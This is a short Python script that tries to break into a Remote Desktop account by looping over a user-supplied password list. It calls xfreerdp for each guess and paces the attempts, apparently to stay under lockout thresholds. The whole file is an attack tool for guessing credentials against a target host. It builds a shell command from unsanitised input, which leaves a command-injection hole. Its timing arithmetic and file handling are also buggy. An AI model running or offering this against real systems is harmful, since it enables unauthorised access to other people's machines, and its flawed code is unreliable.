import time
import os
import subprocess

# Input values from user
ip_address = input("Enter the IP address: ")
username = input("Enter the username: ")
passwords = input("Enter the list of passwords (separated by comma): ").split(",")
domain = input("Enter the domain: ")
rate_limit = int(input("Enter the rate limit for password attempts (in minutes): "))

# Loop through the list of passwords and attempt to login
for password in passwords:
    # Rate limit password attempts
    current_time = time.time()
    last_attempt_time = os.path.getmtime("last_attempt.txt")
    time_diff = current_time - last_attempt_time
    if time_diff < (rate_limit * 60):
        print(f"Rate limit exceeded. Waiting for {int(rate_limit - time_diff/60)} minutes.")
        time.sleep(int(rate_limit - time_diff/60) * 60)
    # Attempt to login
    print(f"Trying password: {password}")
    cmd = f'xfreerdp /v:{ip_address} /u:{username}@{domain} /p:{password}'
    result = subprocess.call(cmd, shell=True)
    if result == 0:
        print("Login successful!")
        break
    # Record last attempt time
    with open("last_attempt.txt", "w") as f:
        f.write(str(time.time()))
